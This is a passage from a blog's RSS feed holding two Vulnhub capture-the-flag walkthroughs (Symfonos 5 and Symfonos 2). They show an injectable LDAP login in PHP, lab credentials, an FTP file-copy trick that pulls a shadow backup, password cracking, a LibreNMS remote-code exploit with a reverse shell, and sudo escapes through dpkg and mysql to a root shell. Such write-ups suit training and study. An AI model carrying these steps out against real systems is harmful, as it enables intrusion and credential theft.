$filter &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;(&amp;amp;(uid=&lt;/span>&lt;span style="color:#e6db74">$username&lt;/span>&lt;span style="color:#e6db74">)(userPassword=&lt;/span>&lt;span style="color:#e6db74">$password&lt;/span>&lt;span style="color:#e6db74">))&amp;#34;&lt;/span>;
$result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_search&lt;/span>($ldap_ch, &lt;span style="color:#e6db74">&amp;#34;dc=symfonos,dc=local&amp;#34;&lt;/span>, $filter);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>$result) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
}
$info &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ldap_get_entries&lt;/span>($ldap_ch, $result);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>($info) &lt;span style="color:#f92672">||&lt;/span> ($info[&lt;span style="color:#e6db74">&amp;#34;count&amp;#34;&lt;/span>] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>)) {
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">FALSE&lt;/span>;
}
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">TRUE&lt;/span>;
}
&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>])){
$username &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]);
$password &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">urldecode&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]);
$bIsAuth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">authLdap&lt;/span>($username, $password);
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span> $bIsAuth ) {
$msg &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Invalid login&amp;#34;&lt;/span>;
} &lt;span style="color:#66d9ef">else&lt;/span> {
$_SESSION[&lt;span style="color:#e6db74">&amp;#34;loggedin&amp;#34;&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
&lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;location: home.php&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">exit&lt;/span>;
}
}
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;html&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;head&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; type=&amp;#34;text/css&amp;#34; href=&amp;#34;/static/bootstrap.min.css&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/head&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;body&amp;gt;&amp;lt;br /&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;row justify-content-center&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-8&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-header&amp;#34;&amp;gt;Login&amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;card-body&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;form action=&amp;#34;admin.php&amp;#34; method=&amp;#34;GET&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;email_address&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Username&amp;lt;/label&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;text&amp;#34; id=&amp;#34;username&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;username&amp;#34; required autofocus&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;form-group row&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;label for=&amp;#34;password&amp;#34; class=&amp;#34;col-md-4 col-form-label text-md-right&amp;#34;&amp;gt;Password&amp;lt;/label&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;input type=&amp;#34;password&amp;#34; id=&amp;#34;password&amp;#34; class=&amp;#34;form-control&amp;#34; name=&amp;#34;password&amp;#34; required&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;div class=&amp;#34;col-md-6 offset-md-4&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;btn btn-primary&amp;#34;&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> Login
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/button&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/form&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;&amp;lt;?php echo $msg; ?&amp;gt;&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/div&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/body&amp;gt;
&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/html&amp;gt;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>From admin.php we get credentials that can be used on ldap.&lt;/p>
&lt;h1 id="getting-shell-as-zeus">Getting shell as zeus&lt;/h1>
&lt;p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ldapsearch -x -h 192.168.191.132 -D &lt;span style="color:#e6db74">&amp;#34;CN=admin,DC=symfonos,DC=local&amp;#34;&lt;/span> -w qMDdyZh3cT6eeAWD -b &lt;span style="color:#e6db74">&amp;#34;DC=symfonos,DC=local&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>From the output, the userPassword is base64 encoded. After decoding it we get &lt;code>cetkKf4wCuHC9FET&lt;/code> and can login
as zeus via ssh.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="privilege-escalation">Privilege Escalation&lt;/h1>
&lt;p>Running &lt;code>sudo -l&lt;/code>, we see that zeus has sudo permissions to run dpkg with no password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>From &lt;a href="https://gtfobins.github.io/gtfobins/dpkg/" target="_blank" rel="noopener">gtfobins&lt;/a>
we only need to execute the below commands to
abuse this.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">sudo dpkg -l
!/bin/bash
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h1 id="extras">Extras&lt;/h1>
&lt;p>When accessing the passwd file, we couldn&amp;rsquo;t see any user with home directory in /home looking at the configuration
postexploitation we see that the services are running in docker containers.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos5/symfonos5-14.png" alt="symfonos" class="center" style="border-radius: 8px;" /></content></item><item><title>Vulnhub: Symfonos 2</title><link>https://blog.ikuamike.io/posts/2021/symfonos2/</link><pubDate>Wed, 10 Feb 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/symfonos2/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/symfonos1/symfonos1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Difficulty&lt;/th>
&lt;th>Release Date&lt;/th>
&lt;th>Author&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Intermediate&lt;/td>
&lt;td>18 July 2019&lt;/td>
&lt;td>Zayotic&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="summary">Summary&lt;/h1>
&lt;p>This box had quite a good number of misconfigurations and vulnerabilities. Initial access was through copying a shadow
backup file to a smb share accessible anonymously using a file copy vulnerability in proftpd. Then lateral movement
and privilege escalation was achieved by exploiting rce a locally running librenms instance and finally abusing
sudo permissions on mysql to get root.&lt;/p>
&lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
&lt;pre>&lt;code>Nmap scan report for 192.168.191.129
Host is up (0.00028s latency).
PORT STATE SERVICE VERSION
21/tcp open ftp ProFTPD 1.3.5
22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
| 2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
| 256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)
|_ 256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)
80/tcp open http WebFS httpd 1.21
|_http-server-header: webfs/1.21
|_http-title: Site doesn't have a title (text/html).
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)
| smb-os-discovery:
| OS: Windows 6.1 (Samba 4.5.16-Debian)
| Computer name: symfonos2
| NetBIOS computer name: SYMFONOS2\x00
| Domain name: \x00
| FQDN: symfonos2
|_ System time: 2021-01-25T07:02:21-06:00
| smb-security-mode:
| account_used: guest
| authentication_level: user
| challenge_response: supported
|_ message_signing: disabled (dangerous, but default)
| smb2-security-mode:
| 2.02:
|_ Message signing enabled but not required
| smb2-time:
| date: 2021-01-25T13:02:21
|_ start_date: N/A
&lt;/code>&lt;/pre>&lt;h1 id="enumeration">Enumeration&lt;/h1>
&lt;h2 id="samba-139445">Samba (139/445)&lt;/h2>
&lt;p>Running smbmap on the target we see we can access the &lt;strong>anonymous&lt;/strong> share without credentials:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -R -H 192.168.191.129
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/smbmap.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Using smbclient to download log.txt from the anonymous share.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbclient &lt;span style="color:#ae81ff">\\\\&lt;/span>192.168.191.129&lt;span style="color:#ae81ff">\\&lt;/span>anonymous -N -c &lt;span style="color:#e6db74">&amp;#39;get backups\log.txt log.txt&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>From log.txt, we discover a backup of the shadow file is created in /var/backups/&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h2 id="ftp-21">FTP (21)&lt;/h2>
&lt;p>Checking for known vulnerabilities of the proftp version using searchsploit, we find several.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>The command execution exploits available rely on creating a php file on the existing webserver that would be executed.
However, the web server is running &lt;a href="https://github.com/ourway/webfsd" target="_blank" rel="noopener">webfs&lt;/a>
which only serves static content.&lt;/p>
&lt;p>We can only take advantage of the file copy vulnerability. From log.txt, the smb configuration gives the location
of the anonymous share:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-3.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>We can exfiltrate information to the anonymous share by exploiting file copy on proftpd. Using the PoC shown here
&lt;a href="https://www.exploit-db.com/exploits/36742,">https://www.exploit-db.com/exploits/36742,&lt;/a> let&amp;rsquo;s get the shadow.bak file. You can either use netcat or telnet.
In this case I use netcat.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nc -vn 192.168.191.129 &lt;span style="color:#ae81ff">21&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-4.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Running smbmap command again we see that we have shadow.bak file.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;h2 id="shell-as-aeolus">Shell as aeolus&lt;/h2>
&lt;p>After downloading the shadow file from the smb we can crack it with john and rockyou wordlist.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">john --wordlist&lt;span style="color:#f92672">=&lt;/span>/usr/share/wordlists/rockyou.txt shadow.bak
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Using sergioteamo as the password we can access ssh as aeolus.&lt;/p>
&lt;p>Doing some basic manual enumeration, we see some ports listening on localhost.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>8080 would most likely be a webserver, so I&amp;rsquo;ll tunnel to it first using an ssh port forward.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ssh -L 8000:127.0.0.1:8080 aeolus@192.168.191.129
&lt;/code>&lt;/pre>&lt;/div>&lt;p>When we visit http://127.0.0.1:8000 on the browser, we find that LibreNMS is running here.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Using searchsploit again we find two existing vulnerabilities for version 1.46.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-13.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Since we can&amp;rsquo;t verify the version of librenms currently running, we&amp;rsquo;ll try the exploits and see if they work. I&amp;rsquo;ll go for the RCE.&lt;/p>
&lt;p>Using the exploit script provided here &lt;a href="https://www.exploit-db.com/exploits/47044,">https://www.exploit-db.com/exploits/47044,&lt;/a> we need to provide url, session cookies,
rhost and rport where the reverse shell will be received.&lt;/p>
&lt;p>Login using the earlier discovered credentials &lt;strong>aeolus : sergioteamo&lt;/strong>, then retrieve the cookies using burpsuite.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-10.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>Run the exploit as below and catch the reverse shell using netcat.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-11.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>We are now the cronus user.&lt;/p>
&lt;h2 id="getting-a-root-shell">Getting a root shell&lt;/h2>
&lt;p>Running sudo -l reveals cronus can run mysql as root with no password.&lt;/p>
&lt;p>Dropping into mysql as root user, we can get a root shell using the below command.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#ae81ff">\!&lt;/span> bash
&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/symfonos2/symfonos2-12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
&lt;p>You can reach/follow me on Twitter if you have some feedback or questions.&lt;/p>
&lt;p>Twitter: &lt;a href="https://twitter.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p>
&lt;p>Github: &lt;a href="https://github.com/ikuamike" target="_blank" rel="noopener">ikuamike&lt;/a>
&lt;/p></content></item></channel></rss>